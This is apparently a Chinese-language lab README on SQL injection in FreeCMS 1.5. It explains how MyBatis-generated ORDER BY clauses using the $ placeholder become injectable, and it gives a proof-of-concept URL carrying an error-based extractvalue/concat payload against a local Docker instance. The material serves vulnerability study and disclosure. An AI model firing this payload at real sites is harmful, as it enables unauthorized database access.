

## 测试环境

编译及运行环境：

```
docker-compose build
docker-compose up -d
```


## mybatis sql注入问题

[Mybatis框架下SQL注入漏洞面面观](https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=2727827368&idx=1&sn=765d0835f0069b5145523c31e8229850&mpshare=1&scene=1&srcid=0926a6QC3pGbQ3Pznszb4n2q#rd)
[审计mybatis的sql注入](http://xdxd.love/2016/03/14/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5/)


##  freecms 最新版 1.5 存在的sql注入漏洞

使用mybatis框架，一般并不会手动去写每一个xml配置，而是使用插件自动生成，而插件生成的xml中，默认情况下order by使用的是$占位符。如果应用层不做用户输入过滤，是存在sql注入漏洞的。

默认的xml配置：

![](img/01.png)
![](img/02.png)


## POC

访问 http://127.0.0.1:8080/register.jsp 注册一个普通用户。然后通过http://127.0.0.1:8080/mlogin.jsp登录。

访问：http://127.0.0.1:8080/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))

![](img/03.png)
